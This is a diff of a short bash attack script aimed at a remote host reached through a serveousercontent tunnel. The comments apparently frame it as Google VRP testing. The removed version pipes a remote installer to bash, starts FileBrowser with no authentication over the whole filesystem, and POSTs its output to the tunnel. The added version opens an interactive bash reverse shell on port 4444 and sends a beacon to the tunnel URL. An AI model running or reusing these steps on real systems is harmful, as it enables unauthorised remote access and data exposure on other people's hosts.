@@ -1,20 +1,10 @@
 #!/bin/bash
-# TARGET: https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com
-URL="https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com"
+# Replace with the new URL from Terminal 1
+URL="https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com"
 
-{
-  echo "=== [!] GOOGLE VRP: DEPLOYING FILE-MGMT INTERFACE ==="
+# The pwncat-compatible reverse shell
+# It connects to the tunnel's entrance on the host
+(bash -i >& /dev/tcp/localhost/4444 0>&1) &
 
-  # 1. Download the static binary (fast and lightweight)
-  curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash
-  
-  # 2. Launch FileBrowser on port 9001
-  # We point the "root" to / so you can see the whole Google host
-  filebrowser -p 9001 -r / --noauth &
-  
-  sleep 3
-  echo "[+] File Manager active at /. Forwarding to Mac..."
-
-  # 3. Use the Python 'Bridge' to pump the Web UI traffic to your Mac
-  python3 -c "import socket,sys;s=socket.socket();s.connect(('127.0.0.1',9001));[s.send(sys.stdin.buffer.read())]" 
-} | curl -s -X POST --data-binary @- "$URL"
+# Beacon to confirm execution
+echo "[!] ALIGNMENT FIXED: PWNCAT CALLING 4444" | curl -s -X POST --data-binary @- "$URL"
